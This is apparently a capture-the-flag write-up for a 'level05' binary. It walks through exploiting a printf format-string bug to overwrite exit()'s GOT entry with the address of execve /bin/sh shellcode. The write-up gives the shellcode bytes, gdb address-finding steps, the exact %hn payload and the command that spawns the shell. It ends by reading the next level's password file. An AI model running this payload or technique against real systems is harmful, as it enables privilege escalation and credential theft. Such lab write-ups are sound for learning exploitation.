### Download binary
``scp -P4242 level05@192.168.31.33:/home/users/level05/level05 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (refer to source code)

The printf function is used improperly, which enables a format string attack :
``printf(inputBuffer);``

PS : If characters of inputBuffer are an uppercase letter, it attempts to convert it to lowercase.

We gonna use this vulnerability to **overwrite the GOT and replace exit() adress by a shellcode adress**.

----

### The ShellCode

**Our shellcode**

``https: //shell-storm.org/shellcode/files/shellcode-811.html``

First we export our shellcode in an environment variable

``export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')``

----

### Gathering infos to build the payload

**Find the adress of the shellcode in memory**

``gdb ./level05``
``(gdb) b main``
[...]
``(gdb) r``
[...]
``(gdb) x/200xs environ``
[...]
>0xffffd4d6:	 "SHELLCODE=\220\220\220\220\220\[...]
>0xffffd59e:	 "\220\220\220\220\220\220\220\[...]

We're keeping this 0xffffd59e, to be somewhere inside the NOP slide.

Converted to a number : 4294956446.

**Find exit adress in the GOT :**

``gdb ./level05``
``(gdb) disas exit``
>Dump of assembler code for function exit@plt:
>   0x08048370 <+0>:	jmp    *0x80497e0

The adress is **0x80497e0**.

**Find the printf memory's spot**

``(python -c 'print "AAAA" + ".%x" * 11') | ./level05``
>aaaa.64.f7fcfac0.0.0.0.0.ffffffff.ffffd744.f7fdb000.**61616161**.2e78252e.252e7825

Located in the 10th spot.

----

### Payload
Because 4294956446 characters are too much to print in a reasonnable time, we need to split our target address into two parts: the two most significant bytes (strong bytes) and the two least significant bytes (weak bytes), we gonna use **%hn** printf format to write in a specific 2 bytes memory spot.

**Splitting the adress and convert to number**

ffff = 65535
d59e = 54686

**Payload explanation**

- adress of the 2 strong bytes of exit()
- adress of the 2 weak bytes of exit()
- d59e in decimal - bytes allready written (8)
- 10th spot in memory
- ffff in decimal - bytes allready written (54686)
- 11th spot in memory
--> **080497e0 + 080497e2 + 54678 + %10hn + 10849 + %11hn**

**Our Payload**

``python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%54678d' + '%10\$hn' + '%10849d' + '%11\$hn'"``

----

### Bypassing security

``(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%54678d' + '%10\$hn' + '%10849d' + '%11\$hn'"; cat) | ./level05``

``whoami``
>level06

``cat /home/users/level06/.pass``
>h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
